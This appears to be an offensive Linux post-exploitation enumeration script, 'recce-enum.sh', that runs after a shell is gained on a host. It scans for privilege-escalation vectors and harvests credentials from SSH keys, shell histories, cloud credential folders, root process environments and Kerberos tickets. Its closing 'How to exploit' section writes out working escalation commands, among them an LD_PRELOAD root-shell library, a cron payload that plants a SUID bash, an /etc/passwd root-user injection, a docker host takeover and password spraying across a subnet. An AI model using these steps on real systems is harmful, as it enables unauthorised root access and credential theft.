#!/usr/bin/env bash
# recce-enum.sh - thorough, READ-ONLY local enumeration for Linux/Unix.
#
# The on-target companion to recce: run this once you have a shell on a host to
# surface privilege-escalation vectors and sensitive exposure (a linPEAS-style
# sweep). It changes NOTHING - only reads system state with built-in tools - so
# it is safe to run and does not behave like malware. There is no exploit code,
# no download, no obfuscation. If an EDR flags a plain read-only script,
# coordinate an exclusion rather than trying to evade it.
#
# Usage:  ./recce-enum.sh [-t] [-q] [-o report.txt]
#           -t  self-test: parse-check the script + report which sections will
#               run on this host. Runs NO enumeration - safe first step.
#           -q  quiet: findings only (skip the raw dumps)
#           -o  also write everything to a file
#
# Findings marked [!] are worth a closer look.

export LC_ALL=C
QUIET=0; OUT=""; SELFTEST=0
while getopts "qo:th" opt; do
  case "$opt" in
    q) QUIET=1 ;;
    o) OUT="$OPTARG" ;;
    t) SELFTEST=1 ;;
    *) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
  esac
done

# --- output helpers (no colour if not a TTY, so piped/logged output is clean) ---
if [ -t 1 ]; then C_H='\033[1;36m'; C_F='\033[1;33m'; C_R='\033[0m'; else C_H=''; C_F=''; C_R=''; fi
_emit() { if [ -n "$OUT" ]; then printf '%b\n' "$1" | sed 's/\x1b\[[0-9;]*m//g' >>"$OUT"; fi; printf '%b\n' "$1"; }
sec()  { _emit ""; _emit "${C_H}==== $* ====${C_R}"; }
info() { [ "$QUIET" -eq 1 ] || _emit "$*"; }
find_() { _emit "${C_F}[!] $*${C_R}"; }         # a finding worth attention
have() { command -v "$1" >/dev/null 2>&1; }
cat_() { [ "$QUIET" -eq 1 ] && return 0; [ -r "$1" ] && { _emit "--- $1 ---"; sed 's/^/    /' "$1" 2>/dev/null; }; }

# --- self-test (pre-flight): verify the script + host, run NO enumeration ---
if [ "$SELFTEST" -eq 1 ]; then
  echo "recce-enum.sh self-test - verifies the script + host; runs NO enumeration"
  echo
  # 1) Syntax: parse-check this script.
  err=$(bash -n "$0" 2>&1)
  if [ -z "$err" ]; then echo "[ OK ] script parses cleanly (no syntax errors)"
  else echo "[FAIL] syntax errors:"; printf '%s\n' "$err" | sed 's/^/       /'; fi
  # 2) Host environment.
  os=$(. /etc/os-release 2>/dev/null; printf '%s' "${PRETTY_NAME:-unknown}")
  echo "[info] shell: ${BASH_VERSION:-sh}  user: $(id -un 2>/dev/null) (uid $(id -u 2>/dev/null))  kernel: $(uname -r 2>/dev/null)"
  echo "[info] os: $os"
  if [ "$(id -u 2>/dev/null)" = "0" ]; then echo "[info] running as root - full visibility"
  else echo "[info] non-root - some checks read less (still works)"; fi
  # 3) Command availability -> which section families will produce data here.
  chk_all() { n="$1"; shift; m=""; for c in "$@"; do have "$c" || m="$m $c"; done
              [ -z "$m" ] && echo "[ OK ] $n" || echo "[skip] $n - missing:$m (those checks self-skip)"; }
  chk_any() { n="$1"; shift; for c in "$@"; do have "$c" && { echo "[ OK ] $n (using $c)"; return; }; done
              echo "[skip] $n - none of: $* (those checks self-skip)"; }
  chk_all "System & kernel"     uname cat
  chk_all "Sudo"                sudo
  chk_all "SUID / SGID"         find
  chk_any "Capabilities"        getcap
  chk_any "Services (systemd)"  systemctl
  chk_all "Processes"           ps
  chk_any "Network sockets"     ss netstat
  chk_any "Network config"      ip ifconfig
  chk_any "Software inventory"  dpkg rpm
  chk_all "Core (always used)"  find grep sed awk
  echo
  echo "Self-test complete. If the parse is OK, a real run is safe:  ./recce-enum.sh"
  exit 0
fi

[ -n "$OUT" ] && : >"$OUT"
_emit "${C_H}recce-enum${C_R}  host=$(hostname 2>/dev/null)  user=$(id -un 2>/dev/null)  $(date 2>/dev/null)"
_emit "read-only local enumeration - nothing on this host is modified"

# ============================================================ system / kernel
sec "System & kernel"
info "$(uname -a 2>/dev/null)"
cat_ /etc/os-release
info "uptime: $(uptime 2>/dev/null)"
KREL=$(uname -r 2>/dev/null)
info "kernel release: $KREL"
# Cheap heuristic: very old kernels have many public local exploits.
kmaj=${KREL%%.*}; kmin=$(printf '%s' "$KREL" | cut -d. -f2)
if [ -n "$kmaj" ] && { [ "$kmaj" -lt 4 ] || { [ "$kmaj" -eq 4 ] && [ "${kmin:-0}" -lt 15 ]; }; }; then
  find_ "Old kernel ($KREL) - run a local-exploit suggester (linux-exploit-suggester.sh) offline"
fi
# Dirty Pipe (CVE-2022-0847): kernel 5.8 up to 5.16.11 / 5.15.25 / 5.10.102.
if [ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 8 ] && [ "$kmin" -le 16 ]; then
  find_ "Kernel $KREL is in the Dirty Pipe (CVE-2022-0847) range (5.8-5.16.11) - verify patch level"
fi
[ -r /proc/version ] && info "$(cat /proc/version 2>/dev/null)"
info "arch: $(uname -m 2>/dev/null)"
# PwnKit (CVE-2021-4034): any pkexec/polkit before Jan-2022 is exploitable.
if have pkexec; then
  pv=$( { dpkg -l policykit-1 2>/dev/null || rpm -q polkit 2>/dev/null; } | grep -oE '0\.[0-9]+' | head -1)
  find_ "pkexec present (polkit ${pv:-?}) - verify PwnKit CVE-2021-4034 patch (fixed Jan-2022); trivially root if unpatched"
fi

# ============================================================ current context
sec "Who am I / privileges"
info "$(id 2>/dev/null)"
info "groups: $(groups 2>/dev/null)"
case " $(id -Gn 2>/dev/null) " in
  *" docker "*)  find_ "In the 'docker' group -> trivially root (mount / into a container)";;
esac
case " $(id -Gn 2>/dev/null) " in
  *" lxd "*|*" lxc "*) find_ "In the 'lxd/lxc' group -> root via a privileged container";;
esac
case " $(id -Gn 2>/dev/null) " in
  *" disk "*)  find_ "In the 'disk' group -> read/write raw devices (debugfs /dev/sdaX -> read /etc/shadow)";;
esac
case " $(id -Gn 2>/dev/null) " in
  *" adm "*)   find_ "In the 'adm' group -> read system logs (may contain creds)";;
esac
[ "$(id -u 2>/dev/null)" = "0" ] && find_ "Already UID 0 (root)"

# ============================================================ sudo
sec "Sudo"
if have sudo; then
  SUV=$(sudo -V 2>/dev/null | head -1)
  info "$SUV"
  # Baron Samedit (CVE-2021-3156) affects sudo < 1.9.5p2.
  sv=$(printf '%s' "$SUV" | grep -oE '1\.[0-9]+\.[0-9]+' | head -1)
  case "$sv" in
    1.8.*|1.9.0|1.9.1|1.9.2|1.9.3|1.9.4) find_ "sudo $sv may be vulnerable to CVE-2021-3156 (Baron Samedit) - local root";;
  esac
  SUDOL=$(sudo -n -l 2>/dev/null)
  if [ -n "$SUDOL" ]; then
    info "sudo -l (no password prompt):"; printf '%s\n' "$SUDOL" | sed 's/^/    /'
    printf '%s' "$SUDOL" | grep -qi "NOPASSWD" && find_ "NOPASSWD sudo entries present -> check GTFOBins for the allowed binaries"
    printf '%s' "$SUDOL" | grep -qiE '\(ALL(\s*:\s*ALL)?\)\s*ALL' && find_ "sudo grants (ALL) ALL -> full root"
    printf '%s' "$SUDOL" | grep -qi "env_keep.*LD_PRELOAD" && find_ "LD_PRELOAD preserved in sudo env -> library injection to root"
  else
    info "sudo -l: needs a password or not permitted (try 'sudo -l' interactively)"
  fi
fi
cat_ /etc/sudoers
for f in /etc/sudoers.d/*; do cat_ "$f"; done

# ============================================================ SUID / SGID / caps
sec "SUID / SGID / capabilities"
# GTFOBins-known SUID abusables worth flagging immediately.
GTFO='aa-exec|ab|agetty|alpine|ar|arj|arp|ash|aspell|atobm|awk|base32|base64|basenc|bash|bridge|busybox|cabextract|capsh|cat|chmod|chown|chroot|cp|cpio|csh|csplit|cut|dash|date|dd|dialog|diff|dmsetup|docker|dosbox|ed|emacs|env|eqn|expand|expect|file|find|flock|fmt|fold|gawk|gcore|gdb|genie|gimp|grep|gtester|hd|head|hexdump|highlight|iconv|install|ionice|ip|jjs|join|jq|jrunscript|ksh|ld.so|less|logsave|look|lua|make|mawk|more|mosquitto|msgattrib|msgcat|msgconv|msgfilter|msgmerge|msguniq|multitime|mv|nano|nawk|nice|nl|nmap|node|nohup|od|openssl|openvpn|paste|perl|pg|php|pr|python|python2|python3|readelf|restic|rev|rlwrap|rsync|rtorrent|run-parts|rvim|scp|screen|script|sed|service|setarch|shuf|soelim|sort|sqlite3|ss|ssh|start-stop-daemon|stdbuf|strace|strings|sysadmctl|systemctl|tac|tail|tar|taskset|tclsh|tee|telnet|tftp|tic|time|timeout|troff|ul|unexpand|uniq|unshare|unzip|update-alternatives|vi|vim|watch|wc|wget|xargs|xxd|xz|zip|zsh|zsoelim'
info "SUID binaries:"
find / -perm -4000 -type f 2>/dev/null | while read -r b; do
  base=$(basename "$b")
  if printf '%s' "$base" | grep -qxE "$GTFO"; then find_ "SUID $b - GTFOBins escalation candidate"; else info "    $b"; fi
done
info "SGID binaries:"
find / -perm -2000 -type f 2>/dev/null | sed 's/^/    /'
if have getcap; then
  info "File capabilities:"
  getcap -r / 2>/dev/null | while read -r line; do
    case "$line" in
      *cap_setuid*|*cap_setgid*|*cap_dac_read_search*|*cap_dac_override*|*cap_sys_admin*|*cap_sys_ptrace*)
        find_ "Capability: $line -> privesc candidate";;
      *) info "    $line";;
    esac
  done
fi

# ============================================================ cron / timers
sec "Cron & systemd timers"
for f in /etc/crontab /etc/cron.d/* ; do cat_ "$f"; done
info "cron dirs:"; ls -la /etc/cron.* 2>/dev/null | sed 's/^/    /'
# Writable script referenced by a root cron/timer is a classic root path.
for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
  [ -d "$d" ] && find "$d" -maxdepth 1 -type f -writable 2>/dev/null | while read -r w; do find_ "World/'$USER'-writable cron script: $w"; done
done
crontab -l 2>/dev/null | grep -v '^#' | sed 's/^/    (user cron) /'
have systemctl && systemctl list-timers --all 2>/dev/null | sed 's/^/    /' | head -40

# ============================================================ services / processes
sec "Services & processes running as root"
info "Processes (root-owned, top by start):"
ps -eo user,pid,comm,args 2>/dev/null | awk '$1=="root"' | sed 's/^/    /' | head -60
# Writable systemd unit files / writable binaries a root service runs.
if have systemctl; then
  systemctl list-unit-files --type=service 2>/dev/null | awk '{print $1}' | while read -r u; do
    p=$(systemctl show -p FragmentPath --value "$u" 2>/dev/null)
    [ -n "$p" ] && [ -w "$p" ] && find_ "Writable service unit: $p ($u)"
  done
fi
# Writable binaries invoked by root processes.
ps -eo user,args 2>/dev/null | awk '$1=="root"{print $2}' | sort -u | while read -r bin; do
  [ -f "$bin" ] && [ -w "$bin" ] && find_ "Root process runs a WRITABLE binary: $bin"
done

# ============================================================ writable / PATH
sec "Writable files & PATH hijack"
info "PATH: $PATH"
IFS=:; for d in $PATH; do [ -d "$d" ] && [ -w "$d" ] && find_ "Writable dir in PATH: $d (binary planting)"; done; unset IFS
[ -w /etc/passwd ]     && find_ "/etc/passwd is WRITABLE -> add a UID 0 user"
[ -w /etc/shadow ]     && find_ "/etc/shadow is WRITABLE"
[ -r /etc/shadow ]     && find_ "/etc/shadow is READABLE by $(id -un) -> crack hashes"
[ -w /etc/sudoers ]    && find_ "/etc/sudoers is WRITABLE"
info "World-writable files in sensitive dirs (sample):"
find /etc /usr/local /opt -writable -type f 2>/dev/null | sed 's/^/    /' | head -40

# ============================================================ containers
sec "Container / virtualization context"
if [ -f /.dockerenv ] || grep -qaE 'docker|kubepods|containerd|lxc' /proc/1/cgroup 2>/dev/null; then
  find_ "Running INSIDE a container - check for host mounts, caps, and the docker socket"
fi
if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
  find_ "Writable /var/run/docker.sock -> spawn a privileged container to own the host"
fi
info "capabilities of PID 1: $(grep -i cap /proc/1/status 2>/dev/null | tr '\n' ' ')"
have systemd-detect-virt && info "virt: $(systemd-detect-virt 2>/dev/null)"

# ============================================================ NFS / mounts
sec "Mounts & NFS exports"
info "mounts:"; mount 2>/dev/null | sed 's/^/    /' | head -40
cat_ /etc/fstab
if [ -r /etc/exports ]; then
  cat_ /etc/exports
  grep -q "no_root_squash" /etc/exports 2>/dev/null && find_ "NFS export with no_root_squash -> drop a SUID-root binary from a client"
fi
# Mounts that grant power.
mount 2>/dev/null | grep -qE 'nosuid' || info "note: some mounts allow suid (default)"

# ============================================================ credential hunting
sec "Credential & secret hunting"
info "SSH keys / configs:"
find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | sed 's/^/    /' | head -20
for f in /root/.ssh/authorized_keys "$HOME/.ssh/authorized_keys" "$HOME/.ssh/config"; do [ -r "$f" ] && find_ "Readable SSH file: $f"; done
info "History files:"
for f in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.python_history"; do
  [ -r "$f" ] && { info "    $f"; grep -iE 'pass|secret|token|key|-p |curl|wget|ssh ' "$f" 2>/dev/null | sed 's/^/      >> /' | head -15; }
done
info "Config files that often hold secrets:"
find / \( -name '*.env' -o -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' \
  -o -name 'config.php' -o -name 'database.yml' -o -name '.pgpass' -o -name '.netrc' \
  -o -name 'credentials' -o -name 'id_rsa' \) 2>/dev/null | sed 's/^/    /' | head -30
for d in "$HOME/.aws" "$HOME/.config/gcloud" "$HOME/.azure" "$HOME/.kube" "$HOME/.docker"; do
  [ -d "$d" ] && find_ "Cloud/orchestration creds dir present: $d"
done
# Grep a bounded set of dirs for obvious secrets (fast, avoids whole-FS scan).
info "Quick secret grep (bounded):"
grep -rniE 'password[[:space:]]*=|api[_-]?key|secret[[:space:]]*=|BEGIN (RSA|OPENSSH|DSA|EC) PRIVATE KEY' \
  /etc /opt /var/www /srv 2>/dev/null | sed 's/^/    /' | head -30

# ============================================================ network
sec "Network"
info "interfaces:"; { ip -brief addr 2>/dev/null || ifconfig -a 2>/dev/null; } | sed 's/^/    /'
info "listening sockets:"; { ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null; } | sed 's/^/    /' | head -40
info "routes:"; { ip route 2>/dev/null || route -n 2>/dev/null; } | sed 's/^/    /'
cat_ /etc/hosts
info "ARP neighbours:"; { ip neigh 2>/dev/null || arp -a 2>/dev/null; } | sed 's/^/    /' | head -20

# ============================================================ software / misc
sec "Installed software (versions -> match to CVEs offline)"
if have dpkg; then dpkg -l 2>/dev/null | awk '/^ii/{print $2" "$3}' | sed 's/^/    /' | head -80
elif have rpm; then rpm -qa --qf '%{NAME} %{VERSION}\n' 2>/dev/null | sed 's/^/    /' | head -80; fi

# ============================================================ deeper credential dive
sec "Kerberos tickets, keytabs & agent sockets"
find / \( -name '*.keytab' -o -name 'krb5cc_*' -o -name '*.ccache' \) 2>/dev/null | sed 's/^/    /' | head -20
[ -n "$KRB5CCNAME" ] && find_ "KRB5CCNAME set: $KRB5CCNAME (usable Kerberos ticket)"
ls -la /tmp/krb5cc_* /tmp/ssh-* 2>/dev/null | sed 's/^/    /' | head -10
info "Screen/tmux sockets (attach to another user's session):"
ls -la /var/run/screen/ /tmp/tmux-* 2>/dev/null | sed 's/^/    /' | head -10
info "GPG / keyrings:"
find / \( -name 'secring.gpg' -o -name 'pubring.kbx' -o -path '*/.gnupg/*' \) 2>/dev/null | sed 's/^/    /' | head -10

sec "Root process environments & open FDs (creds leak)"
# /proc/<pid>/environ of a root process you can read may hold DB/API secrets.
for pid in $(ps -eo pid,user 2>/dev/null | awk '$2=="root"{print $1}'); do
  if [ -r "/proc/$pid/environ" ]; then
    leak=$(tr '\0' '\n' <"/proc/$pid/environ" 2>/dev/null | grep -iE 'pass|secret|token|key|cred' )
    [ -n "$leak" ] && { find_ "Readable root env at /proc/$pid/environ:"; printf '%s\n' "$leak" | sed 's/^/      >> /' | head -8; }
  fi
done

sec "Web-app & service config files (often world-readable creds)"
find / \( -name 'tomcat-users.xml' -o -name 'context.xml' -o -name 'standalone.xml' \
  -o -name 'application.properties' -o -name 'application.yml' -o -name 'appsettings.json' \
  -o -name 'local.settings.json' -o -name 'docker-compose.yml' -o -name 'Dockerfile' \
  -o -name '.htpasswd' -o -name 'my.cnf' -o -name '.my.cnf' -o -name 'redis.conf' \) 2>/dev/null | sed 's/^/    /' | head -30
info "Backup / swap files that may contain secrets:"
find /etc /opt /var/www /home /srv \( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.save' -o -name '*.swp' \) 2>/dev/null | sed 's/^/    /' | head -25

sec "Writable shared libraries & ld config"
cat_ /etc/ld.so.conf
for d in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null; echo /lib /usr/lib /usr/local/lib); do
  [ -d "$d" ] && [ -w "$d" ] && find_ "Writable library dir: $d (drop a malicious .so a root binary loads)"
done

sec "Environment variables (this shell)"
env 2>/dev/null | grep -viE '^(LS_COLORS|_=)' | sed 's/^/    /' | head -40

sec "Interesting recent & hidden files"
info "recently modified in /etc,/opt,/home (7d):"
find /etc /opt /home -type f -mtime -7 2>/dev/null | sed 's/^/    /' | head -30
info "world-writable dirs missing sticky bit (safe-to-abuse temp):"
find / -path /proc -prune -o -type d -perm -0002 ! -perm -1000 -print 2>/dev/null | sed 's/^/    /' | head -20

# ============================================================ how to exploit
# Reference for the [!] findings above: if the script flagged a vector, here is
# the concrete escalation path. Read-only guidance - nothing is run for you.
sec "How to exploit (reference for the [!] findings above)"
xploit() { _emit "  ${C_F}$1${C_R}"; shift; for l in "$@"; do _emit "      $l"; done; }
xploit "Sudo: NOPASSWD / (ALL) ALL" \
  "sudo -l  -> for each allowed binary check gtfobins.github.io/#<bin>" \
  "e.g.  sudo find . -exec /bin/sh \\; -quit   |   sudo vim -c ':!/bin/sh'   |   sudo su"
xploit "Sudo: LD_PRELOAD kept in env" \
  "write x.c:  void _init(){setgid(0);setuid(0);system(\"/bin/bash -p\");}" \
  "gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c ; sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>"
xploit "Sudo: CVE-2021-3156 (Baron Samedit)" \
  "sudoedit -s '\\' \$(python3 -c 'print(\"A\"*1000)')  crashes -> use a compiled PoC for your libc"
xploit "SUID binary (GTFOBins)" \
  "many keep euid with -p:  bash -p  |  /path/suidbin per gtfobins '#SUID' section" \
  "e.g.  find . -exec /bin/sh -p \\; -quit   |   cp: copy a payload over a root file   |   nmap --interactive"
xploit "File capabilities" \
  "cap_setuid+ep:  ./binary -c 'import os;os.setuid(0);os.system(\"/bin/sh\")' (python)" \
  "cap_dac_read_search:  read /etc/shadow with the capable binary (e.g. tar/xxd)"
xploit "Writable cron / timer script" \
  "append a payload and wait for root to run it:" \
  "echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> <writable-script>   then  /tmp/rb -p"
xploit "Writable dir in PATH / writable root-run binary" \
  "drop a binary with the same name a root process/cron calls (or replace the writable one) -> reverse shell"
xploit "Writable systemd unit" \
  "set ExecStart= to your payload, then  systemctl daemon-reload && systemctl restart <svc>  (or wait for boot)"
xploit "/etc/passwd writable" \
  "echo 'r00t:'\$(openssl passwd -1 -salt x pass)':0:0::/root:/bin/bash' >> /etc/passwd ; su r00t"
xploit "/etc/shadow readable" \
  "unshadow /etc/passwd /etc/shadow > h ; john h   (or hashcat -m 1800)"
xploit "docker group / writable docker.sock" \
  "docker run -v /:/mnt --rm -it alpine chroot /mnt sh    (you are root on the host fs)"
xploit "lxd/lxc group" \
  "import an alpine image, init with security.privileged=true, mount / from host, chroot"
xploit "disk group" \
  "debugfs /dev/sda1 -R 'cat /etc/shadow'   (read any file on the raw device)"
xploit "NFS no_root_squash" \
  "from a box where you are root:  mount -t nfs <ip>:/export /mnt ; cp /bin/bash /mnt/rb; chmod 4755 /mnt/rb  -> /export/rb -p on target"
xploit "PwnKit (CVE-2021-4034, pkexec)" \
  "run a PwnKit PoC (single C file, compile offline) -> instant root if polkit unpatched (pre Jan-2022)"
xploit "Dirty Pipe (CVE-2022-0847)" \
  "compile the PoC; overwrite a SUID binary or /etc/passwd read-only page -> root (kernel 5.8-5.16.11)"
xploit "Old kernel" \
  "linux-exploit-suggester.sh -> pick a matching numbered exploit, compile offline, run"
xploit "Writable shared-library dir" \
  "place a malicious .so a root binary dlopens (match the SONAME) -> code exec as root"
xploit "Found credentials / SSH keys / tokens" \
  "reuse them:  su <user>  |  ssh -i <key> user@host  |  spray across the subnet; check password reuse"
_emit "  Match each item to the ${C_F}[!]${C_R} lines above. Always operate within your rules of engagement."

_emit ""
_emit "${C_H}Done.${C_R} Review every ${C_F}[!]${C_R} line. Nothing was changed on this host."
[ -n "$OUT" ] && _emit "Full report written to: $OUT"
